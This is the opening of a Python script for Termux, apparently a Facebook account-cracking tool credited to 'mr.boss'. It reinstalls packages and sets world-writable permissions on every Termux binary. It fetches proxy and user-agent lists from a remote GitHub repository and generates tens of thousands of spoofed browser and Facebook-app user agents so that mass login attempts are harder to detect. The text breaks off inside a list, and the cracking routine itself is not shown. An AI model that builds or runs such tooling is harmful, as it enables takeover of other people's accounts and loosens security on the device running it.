#!/usr/bin/python3
#coding/utf/
#created/by/mr.boss
def clear():
        os.system('clear')
#_________[ IMPORTING MODULES ]______>>
from os import path
import os,base64,zlib,pip,urllib
print('\x1b[1;97m[√] \x1b[1;92mCHECKING MODULES...')
os.system("pip uninstall urllib3 requests chardet idna certifi -y")
os.system("pip install urllib3 requests chardet idna certifi")
os.system("chmod 777 /data/data/com.termux/files/usr/bin/*");clear() 
import os,requests,json,time,re,random,sys,uuid,string,subprocess
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n\033[0;97m[•]\033[1;32mINSTALLING MISSING MODULES...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('git pull')
except:pass
#_________[ PROXY SERVER ]______>>
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('')
    #time.sleep(2)
    #os.system(f'xdg-open https://www.facebook.com/mradi5000')
proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
#_________[ TRACKING USERS IP ]______>>
ip = requests.get("https://api.ipify.org").text
print('\033[0;97m[•] \033[0;92mBOSS TOOL IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
print("\033[0;97m[•] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
#_________[ UA ]______>>
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ff = random.choice(['414.0.0.30.113', '409.0.0.27.106', '382.0.0.33.111', '381.0.0.29.105'])
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' en-us; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)   
#_________[ NEW UA ]______>>
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        BOSS_ua= random.choice(["Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)","Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)","Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)","Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)","Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)","Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)","Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)","Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM3.211215.227)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 11; Black G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; K6b Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; 4049G Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.1; GOLDTVPlus Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L33)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIS001 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; C60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212BF Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; W NEXT Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; Bmobile AX754 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TIS_001 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; WS5SE Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L03)","Dalvik/2.1.0 (Linux; U; Android 12; T776O Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SGINO6 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; KB2007 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; ABR-LX9 Build/HUAWEIABR-L09)","Dalvik/2.1.0 (Linux; U; Android 11; NCO-LX3 Build/HUAWEINCO-LX3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-4)","Dalvik/2.1.0 (Linux; U; Android 13; SH-RM19s Build/S3067)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A047M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Black_Z Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 22120RN86G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; S10 Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; DS502 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2365 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A135N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; I2207 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.0; W55SE Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; K58 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-7)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; GOA Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; Platinum_B4P Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; VNE-LX3 Build/HONORVNE-L33CM)","Dalvik/2.1.0 (Linux; U; Android 11; G60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(8) power lite Build/POD29.348-25)","Dalvik/2.1.0 (Linux; U; Android 6.0; T6001 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; SILVER_MAX Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; MBOX Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 7.0; BAC-L03 Build/HUAWEIBAC-L03)","Dalvik/2.1.0 (Linux; U; Android 9; S5-SH Build/S0006)","Dalvik/2.1.0 (Linux; U; Android 12; V2206 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 13; V2110 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense F8 MINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 10; NET_ADVANCE Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; SM-T815 Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 9; CHOTT0102 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 11; LM-Q730N Build/RKQ1.210420.001)","Dalvik/2.1.0 (Linux; U; Android 11; U505S Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; YAL-AL50 Build/HUAWEIYAL-AL5002)","Dalvik/2.1.0 (Linux; U; Android 6.1; Note 8 Build/LMY47I)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; XT1034 Build/KXB21.14-L1.61)","Dalvik/2.1.0 (Linux; U; Android 9; YASIN 2K TV Build/PTO7.211208.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J727S Build/M1AJQ)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230405.003.E1)",])
        i_phone_x =random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E247 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.4;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17G80 [FBAN/FBIOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18G82 [FBAN/FBIOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E241 [FBAN/FBIOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/15.4;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/hr_HR;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19B74 [FBAN/FBIOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/15.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"])
        ugen.append(fullagnt)
        infinix = random.choice(["Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]","Mozilla/5.0 (Linux; Android 11; Infinix X689F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]","Mozilla/5.0 (Linux; Android 11; INFINIX MOBILITY LIMITED Infinix X662 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.6.2","Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]","Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/305.0.0.12.106;]","Mozilla/5.0 (Linux; Android 11; Infinix X689F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]","Mozilla/5.0 (Linux; Android 11; Infinix X689F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/350.0.0.5.116;]","Mozilla/5.0 (Linux; Android 11; Infinix X689F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-Infinix X662B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.002 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X689F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/342.0.0.11.89;]"])      
        BOSS = random.choice(["David Client (6988 Windows, IE 9/11) [Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/7.0)]","David Client (7152 Windows, IE 9/11) [Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/7.0)]","David Client (6988 Windows, IE 9/11) [Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko]",]) 
        boss_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 10; SHV43-u Build/S9151)","Dalvik/2.1.0 (Linux; U; Android 6.0; I14 Pro Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Infinix X623B Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 13; 23049PCD8G Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T547U Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 9; SM-N975F Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; M2102K1AC Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 10; A10ST Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 7.0; PSPCZ20A0 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; Hawk_from_EE Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 Build/T1RD33.116-33-3)","Dalvik/2.1.0 (Linux; U; Android 11; V2149 Build/RP1A.200720.012) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 5.1; HS-U602 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1M Build/HUAWEIMAR-L21MEA) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; moto g(30) Build/S0RCS32.41-10-19-14) VD/235","Dalvik/2.1.0 (Linux; U; Android 9; SM-T395N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; p231 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 11; SM-M127N Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-4)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; GlobmallX1 Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 11; IRIS 4K SmartTV FF Build/RTT2.220103.001)","Dalvik/2.1.0 (Linux; U; Android 12; Q18 Build/SP1A.210812.015)","Dalvik/2.1.0 (Linux; U; Android 10; IP-70 MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_x86_64 Build/SE1A.220826.006) ((2.00T_ATV::3.125.3630::emulator64_x86_64_arm64::))","Dalvik/2.1.0 (Linux; U; Android 10; TV Box Build/QTT8.201201.002) ((2.00T_ATV::3.120.3120::HY44G::))","Dalvik/2.1.0 (Linux; U; Android 10; SM-T510 Build/QP1A.190711.020) ((2.00T_AOS::0.1.770::gta3xlwifi::FTV_OTT_DT))","Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020) ((2.00T_AOS::0.1.770::starlte::))","Dalvik/2.1.0 (Linux; U; Android 10; Pixel 2 Build/QP1A.191105.004) ((2.00T_AOS::0.1.731::walleye::))","Dalvik/2.1.0 (Linux; U; Android 10; OTT-G1 Build/QT) ((2.00T_G1::3.120.3164::DV6067Y::))","Dalvik/2.1.0 (Linux; 